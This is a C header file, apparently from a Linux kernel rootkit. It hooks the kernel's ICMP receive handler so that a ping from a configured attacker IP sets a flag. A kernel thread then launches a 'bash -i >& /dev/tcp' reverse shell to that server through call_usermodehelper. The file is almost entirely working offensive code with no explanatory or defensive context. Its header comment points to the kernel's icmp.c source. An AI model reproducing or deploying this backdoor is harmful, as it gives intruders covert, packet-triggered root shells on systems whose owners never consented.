// https://github.com/torvalds/linux/blob/3b07108ada81a8ebcebf1fe61367b4e436c895bd/net/ipv4/icmp.c#L1198
#ifndef ICMP_RCV_H
#define ICMP_RCV_H
#include "../config.h"

int revshell_func(void *data) {
    char revshellCmd[256];
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    snprintf(revshellCmd, sizeof(revshellCmd), "bash -i >& /dev/tcp/%s/%d 0>&1", YOUR_SRV_IP, YOUR_SRV_PORT);
    char *argv[] = {"/bin/bash", "-c", revshellCmd, NULL};

    while (!kthread_should_stop()) {
        if (execute_shell) {
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
            execute_shell = false;
        }
        ssleep(5);
    }
    return 0;
}

static asmlinkage int(*original_icmp_rcv)(struct sk_buff *skb);
static asmlinkage int icmp_rcv_hook(struct sk_buff *skb) {
    struct iphdr *iph;
    u32 dest_ip;

    if (!skb)
        return NF_ACCEPT;

    iph = ip_hdr(skb);

    if (!iph)
        return NF_ACCEPT;

    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&dest_ip, -1, NULL)) {
        return NF_ACCEPT;
    }

    if (iph->saddr == dest_ip) {
        execute_shell = true;
    }

    return original_icmp_rcv(skb);
}

#endif // !ICMP_RCV_H